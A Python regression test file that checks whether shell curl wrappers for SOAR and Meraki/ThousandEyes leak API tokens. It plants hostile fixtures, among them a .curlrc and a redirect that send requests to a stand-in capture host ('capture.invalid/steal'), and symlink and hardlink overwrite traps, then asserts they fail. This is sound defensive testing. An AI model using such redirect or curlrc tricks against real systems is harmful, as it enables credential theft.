"""Behavioral transport regressions for credential-bearing curl wrappers."""

from __future__ import annotations

import json
import os
import subprocess
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

from tests.regression_helpers import REPO_ROOT, write_executable


SOAR_HELPERS = REPO_ROOT / "skills/shared/lib/soar_helpers.sh"
MERAKI_TE_VALIDATE = (
    REPO_ROOT / "skills/cisco-meraki-aam-thousandeyes-setup/scripts/validate.sh"
)


class _Server:
    def __init__(self, handler: type[BaseHTTPRequestHandler]) -> None:
        self.server = HTTPServer(("127.0.0.1", 0), handler)
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)

    @property
    def url(self) -> str:
        return f"http://127.0.0.1:{self.server.server_port}"

    def __enter__(self) -> _Server:
        self.thread.start()
        return self

    def __exit__(self, *_args: object) -> None:
        self.server.shutdown()
        self.server.server_close()
        self.thread.join(timeout=2)


def _run_soar(base_url: str, token_file: Path, *, home: Path) -> subprocess.CompletedProcess[str]:
    env = os.environ.copy()
    env.update(
        {
            "HOME": str(home),
            "SOAR_BASE_URL": base_url,
            "SOAR_TOKEN_FILE": str(token_file),
            "SOAR_API_ALLOW_HTTP": "true",
        }
    )
    return subprocess.run(
        [
            "bash",
            "-c",
            f"""
set -euo pipefail
log() {{ printf '%s\n' "$*" >&2; }}
export -f log
export _CRED_HELPERS_LOADED=true
source {SOAR_HELPERS!s}
soar_rest_call "${{SOAR_BASE_URL}}" "${{SOAR_TOKEN_FILE}}" GET /start
""",
        ],
        cwd=REPO_ROOT,
        env=env,
        capture_output=True,
        text=True,
        check=False,
        timeout=10,
    )


def test_soar_token_is_not_forwarded_across_cross_origin_redirect(tmp_path: Path) -> None:
    target_called = threading.Event()
    primary_token: list[str] = []

    class TargetHandler(BaseHTTPRequestHandler):
        def do_GET(self) -> None:  # noqa: N802
            target_called.set()
            self.send_response(200)
            self.end_headers()

        def log_message(self, *_args: object) -> None:
            return

    with _Server(TargetHandler) as target:

        class RedirectHandler(BaseHTTPRequestHandler):
            def do_GET(self) -> None:  # noqa: N802
                primary_token.append(self.headers.get("ph-auth-token", ""))
                self.send_response(302)
                self.send_header("Location", f"{target.url}/capture")
                self.end_headers()

            def log_message(self, *_args: object) -> None:
                return

        with _Server(RedirectHandler) as primary:
            token = tmp_path / "token"
            token.write_text("soar-secret", encoding="utf-8")
            token.chmod(0o600)
            home = tmp_path / "home"
            home.mkdir()
            result = _run_soar(primary.url, token, home=home)

    assert result.returncode == 0, result.stderr
    assert primary_token == ["soar-secret"]
    assert not target_called.is_set()
    assert "WARNING: LAB ONLY" in result.stderr


def test_soar_curl_q_ignores_hostile_curlrc_extra_url(tmp_path: Path) -> None:
    target_called = threading.Event()
    primary_token: list[str] = []

    class TargetHandler(BaseHTTPRequestHandler):
        def do_GET(self) -> None:  # noqa: N802
            target_called.set()
            self.send_response(200)
            self.end_headers()

        def log_message(self, *_args: object) -> None:
            return

    class PrimaryHandler(BaseHTTPRequestHandler):
        def do_GET(self) -> None:  # noqa: N802
            primary_token.append(self.headers.get("ph-auth-token", ""))
            payload = b'{"version":"1"}'
            self.send_response(200)
            self.send_header("Content-Length", str(len(payload)))
            self.end_headers()
            self.wfile.write(payload)

        def log_message(self, *_args: object) -> None:
            return

    with _Server(TargetHandler) as target, _Server(PrimaryHandler) as primary:
        token = tmp_path / "token"
        token.write_text("soar-secret", encoding="utf-8")
        token.chmod(0o600)
        home = tmp_path / "home"
        home.mkdir()
        (home / ".curlrc").write_text(
            f'location\nurl = "{target.url}/curlrc-capture"\n',
            encoding="utf-8",
        )
        result = _run_soar(primary.url, token, home=home)

    assert result.returncode == 0, result.stderr
    assert primary_token == ["soar-secret"]
    assert not target_called.is_set()
    assert result.stdout == '{"version":"1"}'


def test_meraki_thousandeyes_validator_uses_bound_secret_and_pinned_transport(
    tmp_path: Path,
) -> None:
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    curl_log = tmp_path / "curl.log"
    write_executable(
        bin_dir / "curl",
        """#!/usr/bin/env python3
import json
import os
import sys
from pathlib import Path

args = sys.argv[1:]
with Path(os.environ["CURL_LOG"]).open("a", encoding="utf-8") as handle:
    handle.write(json.dumps(args) + "\\n")
output = None
for index, value in enumerate(args):
    if value in {"-o", "--output"} and index + 1 < len(args):
        output = args[index + 1]
if output:
    Path(output).write_text(
        '{"agents": [{"agentId": "1", "agentName": "mx-agent"}], '
        '"tests": [{"testId": "2", "testName": "aam-test"}]}',
        encoding="utf-8",
    )
""",
    )
    token = tmp_path / "te-token"
    token.write_text("transport-secret\n", encoding="utf-8")
    token.chmod(0o600)
    home = tmp_path / "home"
    home.mkdir()
    (home / ".curlrc").write_text(
        'location\nurl = "https://capture.invalid/steal"\n', encoding="utf-8"
    )
    output_dir = tmp_path / "evidence"
    env = {
        **os.environ,
        "PATH": f"{bin_dir}:{os.environ['PATH']}",
        "HOME": str(home),
        "CURL_LOG": str(curl_log),
    }

    result = subprocess.run(
        [
            "bash",
            str(MERAKI_TE_VALIDATE),
            "--te-token-file",
            str(token),
            "--output-dir",
            str(output_dir),
        ],
        cwd=REPO_ROOT,
        env=env,
        capture_output=True,
        text=True,
        check=False,
        timeout=30,
    )

    assert result.returncode == 0, result.stderr + result.stdout
    calls = [json.loads(line) for line in curl_log.read_text(encoding="utf-8").splitlines()]
    assert len(calls) == 2
    for args in calls:
        assert args[0] == "-q"
        assert "--proto" in args and "=https" in args
        assert "--proto-redir" in args
        assert "--max-redirs" in args and "0" in args
        assert "--globoff" in args
        assert "--connect-timeout" in args and "--max-time" in args
        assert "https://capture.invalid/steal" not in args
        assert "transport-secret" not in "\n".join(args)
    assert output_dir.stat().st_mode & 0o777 == 0o700

    curl_log.unlink()
    token_link = tmp_path / "te-token-link"
    token_link.symlink_to(token)
    rejected = subprocess.run(
        [
            "bash",
            str(MERAKI_TE_VALIDATE),
            "--te-token-file",
            str(token_link),
            "--output-dir",
            str(tmp_path / "rejected"),
        ],
        cwd=REPO_ROOT,
        env=env,
        capture_output=True,
        text=True,
        check=False,
        timeout=30,
    )
    assert rejected.returncode != 0
    assert not curl_log.exists()

    victim = tmp_path / "summary-victim"
    victim.write_text("do-not-touch\n", encoding="utf-8")
    victim.chmod(0o600)
    (output_dir / "summary.json").unlink()
    (output_dir / "summary.json").symlink_to(victim)
    summary_link = subprocess.run(
        [
            "bash",
            str(MERAKI_TE_VALIDATE),
            "--te-token-file",
            str(token),
            "--output-dir",
            str(output_dir),
        ],
        cwd=REPO_ROOT,
        env=env,
        capture_output=True,
        text=True,
        check=False,
        timeout=30,
    )
    assert summary_link.returncode != 0
    assert victim.read_text(encoding="utf-8") == "do-not-touch\n"

    (output_dir / "summary.json").unlink()
    (output_dir / "summary.md").unlink()
    os.link(victim, output_dir / "summary.md")
    summary_hardlink = subprocess.run(
        [
            "bash",
            str(MERAKI_TE_VALIDATE),
            "--te-token-file",
            str(token),
            "--output-dir",
            str(output_dir),
        ],
        cwd=REPO_ROOT,
        env=env,
        capture_output=True,
        text=True,
        check=False,
        timeout=30,
    )
    assert summary_hardlink.returncode != 0
    assert victim.read_text(encoding="utf-8") == "do-not-touch\n"

    if curl_log.exists():
        curl_log.unlink()
    home_mode = home.stat().st_mode & 0o777
    protected = subprocess.run(
        [
            "bash",
            str(MERAKI_TE_VALIDATE),
            "--te-token-file",
            str(token),
            "--output-dir",
            str(home),
        ],
        cwd=REPO_ROOT,
        env=env,
        capture_output=True,
        text=True,
        check=False,
        timeout=30,
    )
    assert protected.returncode != 0
    assert "protected --output-dir" in protected.stderr
    assert home.stat().st_mode & 0o777 == home_mode
    assert not curl_log.exists()

    unrelated = tmp_path / "unrelated"
    unrelated.mkdir(mode=0o755)
    (unrelated / "sentinel").write_text("keep\n", encoding="utf-8")
    unrelated_mode = unrelated.stat().st_mode & 0o777
    refused = subprocess.run(
        [
            "bash",
            str(MERAKI_TE_VALIDATE),
            "--te-token-file",
            str(token),
            "--output-dir",
            str(unrelated),
        ],
        cwd=REPO_ROOT,
        env=env,
        capture_output=True,
        text=True,
        check=False,
        timeout=30,
    )
    assert refused.returncode != 0
    assert (unrelated / "sentinel").read_text(encoding="utf-8") == "keep\n"
    assert unrelated.stat().st_mode & 0o777 == unrelated_mode
    assert not curl_log.exists()

    meraki_key = tmp_path / "meraki-key"
    meraki_key.write_text("meraki-secret\n", encoding="utf-8")
    meraki_key.chmod(0o600)
    bad_origin_env = {**env, "MERAKI_API_BASE": "https://capture.invalid/api/v1"}
    bad_origin = subprocess.run(
        [
            "bash",
            str(MERAKI_TE_VALIDATE),
            "--meraki-api-key-file",
            str(meraki_key),
            "--output-dir",
            str(tmp_path / "bad-origin"),
        ],
        cwd=REPO_ROOT,
        env=bad_origin_env,
        capture_output=True,
        text=True,
        check=False,
        timeout=30,
    )
    assert bad_origin.returncode != 0
    assert "must be exactly https://api.meraki.com/api/v1" in bad_origin.stderr
    assert not curl_log.exists()
